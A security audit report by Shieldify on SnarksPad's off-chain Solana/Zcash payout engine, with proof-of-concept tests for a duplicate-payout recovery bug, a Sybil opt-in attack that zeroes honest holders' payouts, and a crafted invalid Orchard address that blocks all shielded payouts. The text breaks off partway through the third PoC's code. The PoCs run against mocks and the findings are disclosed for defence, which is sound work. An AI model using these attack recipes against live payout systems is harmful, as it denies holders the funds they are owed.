# 1. About Shieldify

Positioned as the first hybrid Web3 Security company, Shieldify shakes things up with a unique subscription-based auditing model that entitles the customer to unlimited audits within its duration, as well as top-notch service quality thanks to a disruptive 6-layered security approach. The company works with very well-established researchers in the space and has secured multiple millions in TVL across protocols, also can audit codebases written in Solidity, Vyper, Rust, Cairo, Move and Go.

Learn more about us at [shieldify.org](https://shieldify.org/).

# 2. Disclaimer

This security review does not guarantee bulletproof protection against a hack or exploit. Smart contracts are a novel technological feat with many known and unknown risks. The protocol, which this report is intended for, indemnifies Shieldify Security against any responsibility for any misbehavior, bugs, or exploits affecting the audited code during any part of the project's life cycle. It is also pivotal to acknowledge that modifications made to the audited code, including fixes for the issues described in this report, may introduce new problems and necessitate additional auditing.

# 3. About SnarksPad

SnarksPad is a Solana-based launchpad built on Meteora's Dynamic Bonding Curve (DBC). It does not deploy any custom on-chain programs. Instead, it integrates three existing audited programs as external components: Meteora DBC, Squads v4 multisig, and the NEAR 1Click bridge.

This security review covers a frozen snapshot of SnarksPad's off-chain engine, implemented in TypeScript and executed using Bun. The repository contains the engine and its audit scope package, rather than the public-facing product codebase.

The off-chain engine is responsible for constructing and signing Solana transactions, calculating and distributing payouts, managing keeper keys, and coordinating cross-chain ZEC swaps.

The audit focuses on the security of these off-chain operations, including transaction construction and execution, payout and recovery mechanisms, key management, and cross-chain interaction logic.

Learn more about the protocols mechanics: [here](https://snarks.fun/#/how)

# 4. Risk Classification

|        Severity        | Impact: High | Impact: Medium | Impact: Low |
| :--------------------: | :----------: | :------------: | :---------: |
|  **Likelihood: High**  |   Critical   |      High      |   Medium    |
| **Likelihood: Medium** |     High     |     Medium     |     Low     |
|  **Likelihood: Low**   |    Medium    |      Low       |     Low     |

## 4.1 Impact

- **High** - results in a significant risk for the protocol’s overall well-being. Affects all or most users
- **Medium** - results in a non-critical risk for the protocol affects all or only a subset of users, but is still
  unacceptable
- **Low** - losses will be limited but bearable, and covers vectors similar to griefing attacks that can be easily repaired

## 4.2 Likelihood

- **High** - almost certain to happen and highly lucrative for execution by malicious actors
- **Medium** - still relatively likely, although only conditionally possible
- **Low** - requires a unique set of circumstances and poses non-lucrative cost-of-execution to rewards ratio for the actor

# 5. Security Review Summary

The security review lasted 3 days with a total of 24 hours dedicated to the audit by the Shieldify team.

Overall, the code is well-written. The audit report contributed by identifying three Medium and five Low severity issues. They're mainly related to issues in the shielded payout and recovery mechanisms.

The SnarksPad team has done a great job with their test suite and provided support and responses to all of the questions that the Shieldify researchers had.

## 5.1 Protocol Summary

| **Project Name**             | SnarksPad                                                                                                                                           |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Repository**               | [snarkspad-engine-audit](https://github.com/snarkspad-audit/snarkspad-engine-audit)                                                                 |
| **Type of Project**          | Solana launchpad on Meteora's Dynamic Bonding Curve                                                                                                 |
| **Security Review Timeline** | 3 days                                                                                                                                              |
| **Review Commit Hash**       | [afe55f055a951a4282b1a23052e1995fbbf536d3](https://github.com/snarkspad-audit/snarkspad-engine-audit/tree/afe55f055a951a4282b1a23052e1995fbbf536d3) |
| **Fixes Review Commit Hash** | [a09ae844b4d319f20017176a5db17afa48c49eff](https://github.com/snarkspad-audit/snarkspad-engine-audit/tree/a09ae844b4d319f20017176a5db17afa48c49eff) |

## 5.2 Scope

The following files were in the scope of the security review:

| File                       | nSLOC |
| -------------------------- | :---: |
| engine/src/epoch/split.ts  |  120  |
| engine/src/epoch/engine.ts | 1209  |
| Total                      | 1329  |

# 6. Findings Summary

The following number of issues have been identified, sorted by their severity:

- **Medium** issues: 3
- **Low** issues: 5
- **Info** issues: 1

| **ID** | **Title**                                                                                  | **Severity** | **Status** |
| :----: | ------------------------------------------------------------------------------------------ | :----------: | :--------: |
| [M-01] | Shielded Payout Recovery Can Resend an Already-Mined Payment                               |    Medium    |   Fixed    |
| [M-02] | Sybil Opt-Ins Can Prevent Shielded Holders from Receiving Payouts                          |    Medium    |   Fixed    |
| [M-03] | An Invalid Orchard Receiver Can Block All Shielded Payouts                                 |    Medium    |   Fixed    |
| [L-01] | Epoch Snapshots Publish an Incorrect Team Share, Causing Valid Epochs to Fail Verification |     Low      |   Fixed    |
| [L-02] | Fresh Wallets Bypass the Rent Guard and Can Exhaust the Keeper's SOL                       |     Low      |   Fixed    |
| [L-03] | A Single Coin's Slow Holder Scan Can Stall Claims for Every Coin                           |     Low      |   Fixed    |
| [L-04] | Late-Confirmed Solana Payout Batches Leave Keeper-Funded Accounts Unrecorded               |     Low      |   Fixed    |
| [L-05] | Interrupted Squads Batch Cleanup Leaves Batch Accounts Open                                |     Low      |   Fixed    |
| [I-01] | An Unresolvable Fee Claimer for One Coin Prevents All Coins from Being Claimed             |     Info     |   Fixed    |

# 7. Findings

# [M-01] Shielded Payout Recovery Can Resend an Already-Mined Payment

## Severity

Medium Risk

## Description

The shielded payout flow in `engine/src/epoch/engine.ts` uses `zcash-intent:` markers to recover payments when `zcash-devtool pay` fails or the keeper terminates before saving the transaction ID. On recovery, `resolveShieldedIntents()` searches the treasury wallet's transaction history for a payment matching the recipient address, amount, and memo.

However, `parseSentPayment()` (`engine/src/zcash/devtool.ts:234-251`) returns only the **first matching transaction**. Since every attempt for an epoch uses the same address, amount, and memo, multiple attempts are indistinguishable during recovery.

The transaction history is ordered by `COALESCE(mined_height, expiry_height) ASC`. Consequently, an earlier expired attempt can appear before a later successfully mined attempt. Recovery therefore binds the payout to the expired transaction, treats it as unpaid, and resends the payment despite the recipient already having received it.

This can result in repeated payouts from the treasury wallet. The issue requires two consecutive failures: an initial broadcast that is never mined, followed by a retry that is successfully mined but whose transaction ID is not returned to the keeper. A malicious lightwalletd (T5 in `audit/THREAT-MODEL.md`) can trigger this scenario.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L848-L853`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L848-L853)

File: [`engine/src/epoch/engine.ts#L787-L791`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L787-L791)

## Proof of Concept

The PoC reproduces the issue by running the real `runEpoch` flow with a mock devtool that preserves the pinned implementation's transaction ordering and broadcast behavior.

<details>
<summary>Proof of Concept code</summary>

```ts
import { afterAll, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { IsolationDeps } from "../engine/src/epoch/stuck";
import type { SwapAdapter } from "../engine/src/swap/types";

// The engine reads its configuration once per process, so each PoC needs a process of its own.
const pocProcess = globalThis as { padPoc?: string };
if (pocProcess.padPoc)
  throw new Error(
    `run each PoC in its own process (bash issues/run-pocs.sh): ${pocProcess.padPoc} already configured the engine here`,
  );
pocProcess.padPoc = "M-01";

// ---- Isolated environment: temp database, fake devtool, every RPC on a closed local port (nothing leaves the machine) ----
const TMP = mkdtempSync(join(tmpdir(), "poc-m01-"));
const WALLET = join(TMP, "treasury");
mkdirSync(WALLET);
writeFileSync(join(TMP, "treasury.age"), "");
const DEVTOOL = join(TMP, "zcash-devtool");
writeFileSync(
  DEVTOOL,
  `#!/bin/sh\nexec "${process.execPath}" "${join(import.meta.dir, "fake-zcash-devtool.ts")}" "$@"\n`,
);
chmodSync(DEVTOOL, 0o755);
for (const k of Object.keys(process.env))
  if (
    /^(PAD_|ZCASH_|TREASURY_|SOLANA_|KEEPER_|HELIUS_|DEVNET_|NEAR|PAYOUTS_)/.test(
      k,
    )
  )
    delete process.env[k];
Object.assign(process.env, {
  PAD_MODE: "devnet",
  PAD_DB_FILE: join(TMP, "pad.sqlite"),
  PAD_PAUSE_FILE: join(TMP, "PAUSED"),
  KEEPER_KEYPAIR_PATH: join(TMP, "keeper.json"),
  SOLANA_DEVNET_RPC: "http://127.0.0.1:9",
  ZCASH_LIGHTWALLETD: "127.0.0.1:9",
  ZCASH_DEVTOOL_BIN: DEVTOOL,
  ZCASH_DEVTOOL_SHA256: createHash("sha256")
    .update(readFileSync(DEVTOOL))
    .digest("hex"),
  TREASURY_WALLET_DIR: WALLET,
  TREASURY_IDENTITY_FILE: join(TMP, "treasury.age"),
});
const db = await import("../engine/src/db");
const { runEpoch } = await import("../engine/src/epoch/engine");
afterAll(() => rmSync(TMP, { recursive: true, force: true }));

// ---- The fake treasury wallet ----
type Tx = {
  txid: string;
  broadcast: boolean;
  minedHeight: number | null;
  outputs: { address: string; zats: string }[];
};
type Wallet = {
  height: number;
  payModes: string[];
  txs: Tx[];
  payCalls: number;
};
const STATE = join(WALLET, "fake-state.json");
const wallet = (): Wallet => JSON.parse(readFileSync(STATE, "utf8"));
const resetWallet = (height: number, payModes: string[]) =>
  writeFileSync(
    STATE,
    JSON.stringify({ height, payModes, txs: [], payCalls: 0 }),
  );
const setHeight = (height: number) =>
  writeFileSync(STATE, JSON.stringify({ ...wallet(), height }));
const short = (txid: string) => txid.slice(0, 8);

// ---- An epoch whose swap settled, with two shielded payout rows waiting to be sent ----
const ADDR_A = "utest1holderaaaa";
const ADDR_B = "utest1holderbbbb";
function settledEpoch(): string {
  db.getDb()
    .query(
      "UPDATE payouts SET sentAt = 'set-aside', sig = COALESCE(sig, 'set-aside') WHERE sentAt IS NULL",
    )
    .run();
  db.getDb()
    .query(
      "UPDATE epochs SET status = 'ok' WHERE status IN ('harvesting','partial','needs_attention')",
    )
    .run();
  const id = `epoch-m01-${crypto.randomUUID().slice(0, 8)}`;
  db.upsertEpoch({
    id,
    at: new Date(Date.now() + 60_000).toISOString(),
    coinMints: "[]",
    harvestedZats: "3000000",
    feeZats: "0",
    status: "partial",
    swapProvider: "near-1click",
    swapRef: "ref",
    swapState: "settled",
    swapAmountOutZats: "960000",
    zcashTxids: "[]",
  });
  db.planPayout({
    epochId: id,
    wallet: "holder-a",
    kind: "shielded",
    amountZats: "400000",
    zcashAddress: ADDR_A,
  });
  db.planPayout({
    epochId: id,
    wallet: "holder-b",
    kind: "shielded",
    amountZats: "500000",
    zcashAddress: ADDR_B,
  });
  return id;
}
/** Mined transactions that paid holder A its 400,000 zats: each one is a delivered payment of the whole batch. */
const minedPaymentsOfBatch = () =>
  wallet().txs.filter(
    (t) =>
      t.broadcast &&
      t.minedHeight !== null &&
      t.minedHeight <= wallet().height &&
      t.outputs.some((o) => o.address === ADDR_A && o.zats === "400000"),
  );
const rows = (id: string) =>
  db
    .getPayouts(id)
    .filter((p) => p.kind === "shielded")
    .map((p) =>
      p.sentAt
        ? `sent(${short(p.sig!)})`
        : p.sig?.startsWith("zcash-intent:")
          ? "zcash-intent"
          : p.sig
            ? `pending(${short(p.sig)})`
            : "fresh",
    )
    .join(", ");

const isolation: IsolationDeps = {
  keeperZecBalance: async () => 0n,
  treasurySpendableZats: async () => 0n,
};
const settledSwap: SwapAdapter = {
  provider: "simulated",
  quote: async () => ({ outZats: 0n }),
  submit: async () => {
    throw new Error("the swap already settled");
  },
  status: async () => {
    throw new Error("the swap already settled");
  },
};
const run = () =>
  runEpoch(settledSwap, async () => {}, { isolation }).then(
    () => "run ok",
    (e: Error) =>
      e.message.includes("zcash-devtool pay failed")
        ? "pay exited 1"
        : e.message,
  );

describe("M-01: shielded payout recovery pays a mined batch again", () => {
  test("control: with only the mined attempt in history, recovery marks the rows sent and pays nothing more", async () => {
    resetWallet(2000, ["broadcast-error"]);
    const id = settledEpoch();
    const r1 = await run();
    console.log(`[control] run 1: T1 relayed, but ${r1} -> rows: ${rows(id)}`);
    setHeight(2010);
    const r2 = await run();
    console.log(
      `[control] run 2: ${r2} -> rows: ${rows(id)}; pay called ${wallet().payCalls} time(s)`,
    );
    expect(wallet().payCalls).toBe(1);
    expect(db.getPayouts(id).every((p) => p.sentAt !== null)).toBe(true);
    expect(minedPaymentsOfBatch()).toHaveLength(1);
  });

  test("bug: once an expired attempt is in the history, the mined batch is paid again on every run", async () => {
    resetWallet(1000, [
      "unbroadcast-fail",
      "broadcast-error",
      "broadcast-error",
      "broadcast-error",
    ]);
    const id = settledEpoch();

    const r1 = await run();
    console.log(
      `[bug] run 1 @1000: T1 stored, its broadcast fails (${r1}) -> rows: ${rows(id)}`,
    );
    expect(rows(id)).toBe("zcash-intent, zcash-intent");
    const t1 = wallet().txs[0]!.txid;

    setHeight(1010);
    const r2 = await run();
    console.log(
      `[bug] run 2 @1010: recovery binds the rows to T1, still unmined (${r2}) -> rows: ${rows(id)}`,
    );

    setHeight(1041); // past T1's expiry height (1040): T1 can never be mined, so resending now is correct
    const r3 = await run();
    const t2 = wallet().txs[1]!.txid;
    console.log(
      `[bug] run 3 @1041: T1 expired, rows resent as T2 ${short(t2)}; T2 is relayed and mined @1042, but ${r3} -> rows: ${rows(id)}`,
    );

    setHeight(1050); // T2 is mined: both holders HAVE been paid
    console.log(
      `[bug] treasury history lists T1 ${short(t1)} (expired, sort height 1040) before T2 ${short(t2)} (mined at 1042)`,
    );
    const r4 = await run();
    console.log(
      `[bug] run 4 @1050: recovery binds the rows to the FIRST match (expired T1, not mined T2), clears them and pays again as T3 (${r4})`,
    );

    setHeight(1060);
    const r5 = await run();
    console.log(`[bug] run 5 @1060: same again, paid again as T4 (${r5})`);
    setHeight(1070);

    const paid = minedPaymentsOfBatch();
    console.log(
      `[bug] RESULT: the same 2 rows were paid in ${paid.length} mined transactions (${paid.map((t) => short(t.txid)).join(", ")})`,
    );
    expect(wallet().payCalls).toBe(4);
    expect(paid.length).toBe(3);
  });
});
```

</details>

The test demonstrates the following sequence:

1. The first payment (T1) fails to broadcast and eventually expires.
2. A retry (T2) is successfully mined, but the keeper receives no transaction ID and retains the `zcash-intent:` markers.
3. During recovery, T1 appears before T2 in the transaction history. The engine selects T1, identifies it as expired, and resends the payment.
4. The same recovery behavior can repeat, resulting in the same payout being delivered multiple times.

The PoC demonstrates that two shielded recipients are paid in three separate mined transactions instead of one.

## Recommendation

Update `parseSentPayment()` to collect all matching transactions rather than returning the first match. During recovery, prefer a mined transaction, or a transaction still in the mempool, over an expired one. Only clear the pending payout when no matching transactions exist or all matching transactions have expired.

Additionally, detect and alert when multiple matching transactions are mined, as this indicates the payout has already been duplicated. Consider assigning a unique attempt ID to each payment and including it in both the intent marker and transaction memo to prevent different attempts from being confused during recovery.

## Team Response

Fixed.

# [M-02] Sybil Opt-Ins Can Prevent Shielded Holders from Receiving Payouts

## Severity

Medium Risk

## Description

In `engine/src/epoch/engine.ts`, `planPayouts()` splits holder rewards between the Solana and shielded rails. Opted-in wallets are assigned to the shielded rail, where `applyShieldedPolicy()` enforces a minimum payout of 100,000 zats per holder. Shares below this threshold are carried forward, while larger payouts are proportionally reduced if they exceed the configured swap cap.

The swap cap is calculated using `shieldedShares.length`, which includes every opted-in wallet in the payout plan, even wallets whose shares are too small to qualify for payment. Consequently, adding wallets with negligible balances reduces the available payout cap for legitimate holders.

An attacker can exploit this by creating multiple wallets, holding just one raw unit of a claimed coin, and opting each wallet into the shielded rail. The opt-in process requires only a wallet signature and a valid Zcash address, with no minimum holding requirement or limit on the number of registered wallets. All wallets can use the same Zcash address.

With `PAD_SWAP_MAX_ZATS = 10,000,000`, approximately 1,800 additional wallets reduce the swap cap to 879,206 zats. In the PoC scenario, ten legitimate holders are each owed 400,000 zats. Their proportional payouts fall below the 100,000-zat minimum, resulting in **no shielded payments being made**.

The issue can persist even after the attacker disposes of their tokens and closes their token accounts. Their previously accumulated carry keeps those wallets in subsequent payout plans, continuing to reduce the swap cap.

Because no swap is attempted, the existing `swap_refused` and `shielded_carried_rounds` alerts are not triggered, and the epoch is recorded as successful. As a result, legitimate holders remain unpaid indefinitely unless they opt out of the shielded rail. Although no funds are directly lost, the attack prevents intended recipients from receiving their accumulated rewards.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L389`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L389)

File: [`engine/src/epoch/engine.ts#L416-L424`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L416-L424)

File: [`engine/src/epoch/engine.ts#L362`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L362)

## Proof of Concept

The PoC reproduces the issue using the real `runEpoch()` payout flow with `PAD_SWAP_MAX_ZATS=10,000,000`.

The test uses two claimed coins:

- **COIN_A:** Ten legitimate opted-in holders, each owed 400,000 zats.
- **COIN_B:** Additional attacker-controlled wallets, each holding one raw unit and using the same Zcash address.

<details>
<summary>Proof of Concept code</summary>

```ts
import { afterAll, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ClaimDeps } from "../engine/src/epoch/engine";
import type { IsolationDeps } from "../engine/src/epoch/stuck";
import type { SwapAdapter } from "../engine/src/swap/types";

// The engine reads its configuration once per process, so each PoC needs a process of its own.
const pocProcess = globalThis as { padPoc?: string };
if (pocProcess.padPoc)
  throw new Error(
    `run each PoC in its own process (bash issues/run-pocs.sh): ${pocProcess.padPoc} already configured the engine here`,
  );
pocProcess.padPoc = "M-02";

// ---- Isolated environment: temp database, every RPC on a closed local port (nothing leaves the machine) ----
const TMP = mkdtempSync(join(tmpdir(), "poc-m02-"));
for (const k of Object.keys(process.env))
  if (
    /^(PAD_|ZCASH_|TREASURY_|SOLANA_|KEEPER_|HELIUS_|DEVNET_|NEAR|PAYOUTS_)/.test(
      k,
    )
  )
    delete process.env[k];
Object.assign(process.env, {
  PAD_MODE: "local",
  PAD_SWAP_MAX_ZATS: "10000000",
  PAD_DB_FILE: join(TMP, "pad.sqlite"),
  PAD_PAUSE_FILE: join(TMP, "PAUSED"),
  KEEPER_KEYPAIR_PATH: join(TMP, "keeper.json"),
  SOLANA_LOCAL_RPC: "http://127.0.0.1:9",
  ZCASH_RPC_URL: "http://127.0.0.1:9",
  ZCASH_LIGHTWALLETD: "127.0.0.1:9",
});
const db = await import("../engine/src/db");
const { claimRemainingCoins, runEpoch, shieldedSwapCap } =
  await import("../engine/src/epoch/engine");
afterAll(() => rmSync(TMP, { recursive: true, force: true }));

/** The engine logs that the snapshot memo cannot reach a Solana RPC (there is none here, by design); muted to keep the output readable. */
async function quietly<T>(fn: () => Promise<T>): Promise<T> {
  const { error, warn, log } = console;
  console.error = console.warn = console.log = () => {};
  try {
    return await fn();
  } finally {
    Object.assign(console, { error, warn, log });
  }
}

// ---- Two launched legacy 1% coins (team 68.75% of a claim, holders 31.25%) ----
for (const mint of ["COIN_A", "COIN_B"]) {
  db.upsertCoin({
    mint,
    name: mint,
    symbol: mint,
    imageUrl: "",
    description: "",
    creator: `creator-${mint}`,
    createdAt: new Date().toISOString(),
    feeBps: 100,
    poolId: null,
    mintDecimals: 6,
    status: "pending",
  });
  db.markCoinLaunched(mint, `pool-${mint}`);
}
const HONEST = Array.from({ length: 10 }, (_, i) => `honest-${i + 1}`);
const isolation: IsolationDeps = {
  keeperZecBalance: async () => 0n,
  treasurySpendableZats: async () => 0n,
};

/**
 * One shielded round: COIN_A claims 12,800,000 (4,000,000 to its 10 honest holders); COIN_B claims `coinBClaim` and is held,
 * 1 raw unit each, by `coinBHolders`. `extraInPlan` is how many extra opted-in wallets the plan holds (for the cap shown).
 */
async function shieldedRound(
  coinBHolders: string[],
  extraInPlan: number,
  coinBClaim = 1_000n,
) {
  const deps: ClaimDeps = {
    claimCoin: async (_epochId, coin) =>
      coin.mint === "COIN_A" ? 12_800_000n : coinBClaim,
    currentHolders: async (mint) =>
      mint === "COIN_A"
        ? HONEST.map((wallet) => ({ wallet, balance: 1_000_000n }))
        : coinBHolders.map((wallet) => ({ wallet, balance: 1n })),
    ensureConfig: async () => {},
    recordExclusions: async () => {},
  };
  let swapSubmits = 0;
  const swap: SwapAdapter = {
    provider: "near-1click",
    quote: async () => ({ outZats: 0n }),
    submit: async () => ({ ref: `swap-${++swapSubmits}` }),
    status: async () => ({ status: "pending" }),
  };
  const out = await quietly(() =>
    runEpoch(swap, (epochId) => claimRemainingCoins(epochId, deps), {
      isolation,
      includeShielded: true,
    }),
  );
  const id = out.epoch!.id;
  const sent = db
    .getPayouts(id)
    .filter((p) => p.kind === "shielded" && HONEST.includes(p.wallet))
    .reduce((a, p) => a + BigInt(p.amountZats), 0n);
  const carried = HONEST.reduce((a, w) => a + db.getCarry(w, "shielded"), 0n);
  const alerts = db
    .listOpenAlerts()
    .map((a) => a.kind)
    .filter((k) => k === "swap_refused" || k === "shielded_carried_rounds");
  return {
    cap: shieldedSwapCap(HONEST.length + extraInPlan),
    sent,
    carried,
    swapSubmits,
    alerts,
    status: db.getEpoch(id)!.status,
  };
}

/** A fresh start for each scenario: no opt-ins, no carry, earlier epochs closed. */
function reset(): void {
  db.getDb()
    .query(
      "UPDATE payouts SET sentAt = 'set-aside', sig = COALESCE(sig, 'set-aside') WHERE sentAt IS NULL",
    )
    .run();
  db.getDb()
    .query(
      "UPDATE epochs SET status = 'ok' WHERE status IN ('harvesting','partial','needs_attention')",
    )
    .run();
  db.getDb().query("DELETE FROM carry").run();
  db.getDb().query("DELETE FROM optins").run();
  db.getDb()
    .query("UPDATE alerts SET resolvedAt = 'reset' WHERE resolvedAt IS NULL")
    .run();
}

const fmt = (n: bigint) => n.toLocaleString("en-US");

describe("M-02: zero-share opt-ins shrink the shielded swap cap", () => {
  test("the honest holders' shielded payout falls to 0 as zero-share opt-ins are added, with no alert", async () => {
    const results = new Map<
      number,
      Awaited<ReturnType<typeof shieldedRound>>
    >();
    for (const n of [0, 1_400, 1_800]) {
      reset();
      const extra = Array.from({ length: n }, (_, i) => `sybil-${i + 1}`);
      for (const w of HONEST) db.upsertOptin(w, "u1honestholderaddress");
      for (const w of extra) db.upsertOptin(w, "u1onesharedattackeraddress"); // the same address for every extra wallet
      const r = await shieldedRound(extra, extra.length);
      results.set(n, r);
      console.log(
        `extra opt-ins ${String(n).padStart(5)}: swap cap ${fmt(r.cap).padStart(9)} | honest sent ${fmt(r.sent).padStart(9)} | honest carried ${fmt(r.carried).padStart(9)} | swap submitted: ${r.swapSubmits > 0 ? "yes" : "no "} | alerts: ${r.alerts.length ? r.alerts.join(",") : "none"} | epoch ${r.status}`,
      );
      if (n === 1_800) {
        const next = await shieldedRound(extra, extra.length); // the next shielded round, same wallets still opted in
        console.log(
          `  next round, same 1,800:                 honest sent ${fmt(next.sent).padStart(9)} | honest carried ${fmt(next.carried).padStart(9)} | swap submitted: ${next.swapSubmits > 0 ? "yes" : "no "} | alerts: ${next.alerts.length ? next.alerts.join(",") : "none"} | epoch ${next.status}`,
        );
        expect(next.sent).toBe(0n);
        expect(next.carried).toBe(8_000_000n);
        expect(next.swapSubmits).toBe(0);
        expect(next.alerts).toEqual([]);
      }
    }
    expect(results.get(0)!.sent).toBe(4_000_000n);
    expect(results.get(1_400)!.sent).toBe(2_864_350n);
    expect(results.get(1_800)!).toMatchObject({
      sent: 0n,
      carried: 4_000_000n,
      swapSubmits: 0,
      alerts: [],
      status: "ok",
    });
  }, 300_000);

  test("persistence: after holding for one round, the extra wallets can sell everything and still block later rounds", async () => {
    reset();
    const extra = Array.from({ length: 1_800 }, (_, i) => `sybil-${i + 1}`);
    for (const w of HONEST) db.upsertOptin(w, "u1honestholderaddress");
    for (const w of extra) db.upsertOptin(w, "u1onesharedattackeraddress");
    // Round 1: COIN_B claims 12,800, so every extra wallet gets a share of 2 or 3 zats: under the 100,000 minimum, so it is carried.
    await shieldedRound(extra, extra.length, 12_800n);
    const smallestCarry = extra.reduce(
      (m, w) =>
        db.getCarry(w, "shielded") < m ? db.getCarry(w, "shielded") : m,
      1n << 62n,
    );
    // Round 2: the extra wallets sold everything (COIN_B has no holder), but planPayouts still plans every wallet with carry.
    const r2 = await shieldedRound([], extra.length);
    console.log(
      `persistence: every extra wallet keeps a carry (smallest ${smallestCarry} zats); after they sell everything the next round sends honest holders ${fmt(r2.sent)} (carried ${fmt(r2.carried)}), swap submitted: ${r2.swapSubmits > 0 ? "yes" : "no"}, alerts: ${r2.alerts.length ? r2.alerts.join(",") : "none"}, epoch ${r2.status}`,
    );
    expect(smallestCarry > 0n && smallestCarry < 100_000n).toBe(true);
    expect(r2).toMatchObject({
      sent: 0n,
      carried: 8_000_000n,
      swapSubmits: 0,
      alerts: [],
      status: "ok",
    });
  }, 300_000);
});
```

</details>

**Results:**

1. **No attacker wallets:** The swap cap is 9,814,850 zats. All legitimate holders receive their full 4,000,000 zats.
2. **1,400 attacker wallets:** The cap drops to 2,864,355 zats, reducing legitimate payouts and carrying the remainder forward.
3. **1,800 attacker wallets:** The cap drops to 879,206 zats. Each legitimate holder's scaled payout falls below the 100,000-zat minimum, so no payments are made.
4. **Subsequent rounds:** Even after the attacker sells their tokens and closes their accounts, accumulated carry keeps the attacker wallets in the payout plan. Legitimate holders continue receiving nothing.

No swap is attempted, no relevant alert fires, and the epoch is recorded as successful.

## Recommendation

Calculate the swap cap using only eligible recipients whose payouts meet the per-holder minimum, rather than the total number of opted-in wallets. This ensures wallets that cannot receive a payment do not consume the transaction's fee allowance.

Additionally, raise an alert when opted-in holders have eligible outstanding payouts but no payment is made. Consider enforcing a minimum eligible holding requirement during opt-in and introducing a limit on the number of registered wallets.

## Team Response

Fixed.

# [M-03] An Invalid Orchard Receiver Can Block All Shielded Payouts

## Severity

Medium Risk

## Description

Holders register Zcash unified addresses through `registerOptin()` (`engine/src/optin/registry.ts:49-66`). Address validation uses `checkZcashAddress()` (`engine/src/zcash/address.ts:41-64`), which runs `zcash-devtool inspect` and accepts addresses if they belong to the expected network and contain an Orchard receiver.

However, the pinned devtool's `inspect` command only decodes the unified address and does not validate whether the Orchard receiver is a valid Pallas point. The `pay` command performs this validation later, using `zcash_keys`, and rejects invalid receivers with an `Invalid Orchard receiver in Unified Address` error.

Since the engine processes all shielded recipients in a single `zcash-devtool pay` call, one invalid address causes the entire batch to fail. An attacker can therefore register a unified address containing an invalid Orchard receiver, requiring only a wallet signature and a payout share plus carry of at least 100,000 zats.

Once the attacker's wallet is included in an epoch's payout plan, every shielded payment in that batch fails, preventing legitimate holders from receiving their ZEC. The swap has already settled, leaving the funds in the treasury.

The failure also interrupts `runLegs` before `sendTeamLeg` executes, preventing the team's share from being delivered. Although the epoch is eventually marked as requiring attention, parked epochs are still retried on subsequent runs. The same invalid opt-in can therefore block future shielded payout rounds.

Unlike the Solana payout leg, which carries forward and closes recipients it cannot pay, the shielded leg has no mechanism to isolate an invalid recipient and continue processing the remaining batch. Recovery requires manual intervention because the invalid address is already copied into planned payout rows, which cannot be removed simply by deactivating the original opt-in.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L893-L918`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L893-L918) (`sendShieldedLeg()` pays all rows in one devtool call)

File: [`engine/src/zcash/address.ts#L41-L64`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/zcash/address.ts#L41-L64) (`checkZcashAddress()` trusts `zcash-devtool inspect`)

## Proof of Concept

The PoC reproduces the issue using the real `registerOptin()` and `runEpoch()` flows with a mock devtool that reproduces the pinned implementation's address inspection and payment validation behavior.

The test creates a unified address containing an invalid Orchard receiver (a 32-byte key consisting entirely of `0xff`). The address passes opt-in validation but is rejected by the payout command.

<details>
<summary>Proof of Concept code</summary>

```ts
import { afterAll, describe, expect, test } from "bun:test";
import { createHash, generateKeyPairSync, sign } from "node:crypto";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ClaimDeps } from "../engine/src/epoch/engine";
import type { IsolationDeps } from "../engine/src/epoch/stuck";
import type { SwapAdapter } from "../engine/src/swap/types";

// The engine reads its configuration once per process, so each PoC needs a process of its own.
const pocProcess = globalThis as { padPoc?: string };
if (pocProcess.padPoc)
  throw new Error(
    `run each PoC in its own process (bash issues/run-pocs.sh): ${pocProcess.padPoc} already configured the engine here`,
  );
pocProcess.padPoc = "M-03";

/**
 * A testnet unified address whose only receiver is Orchard: an 11-byte diversifier (zeros) and pk_d = 32 x 0xff, which is not a
 * valid Pallas point. Built with a ZIP-316 encoder (Bech32m + F4Jumble) that reproduces all 60 official zcash-test-vectors.
 */
const BAD_UA =
  "utest1ea94cz5w6urj8y9lx3sqluzfa7q7dzdps67zxlsnharkerkcqzr4jhzxm0p89qmqlfy8z5ejmq46xak9pgvjzlshekreej7nrqgrrvhq";

// ---- Isolated environment: temp database, fake devtool, every RPC on a closed local port (nothing leaves the machine) ----
const TMP = mkdtempSync(join(tmpdir(), "poc-m03-"));
const WALLET = join(TMP, "treasury");
mkdirSync(WALLET);
writeFileSync(join(TMP, "treasury.age"), "");
writeFileSync(
  join(WALLET, "fake-state.json"),
  JSON.stringify({
    height: 1000,
    payModes: [],
    txs: [],
    payCalls: 0,
    invalidOrchard: [BAD_UA],
  }),
);
const DEVTOOL = join(TMP, "zcash-devtool");
writeFileSync(
  DEVTOOL,
  `#!/bin/sh\nexec "${process.execPath}" "${join(import.meta.dir, "fake-zcash-devtool.ts")}" "$@"\n`,
);
chmodSync(DEVTOOL, 0o755);
for (const k of Object.keys(process.env))
  if (
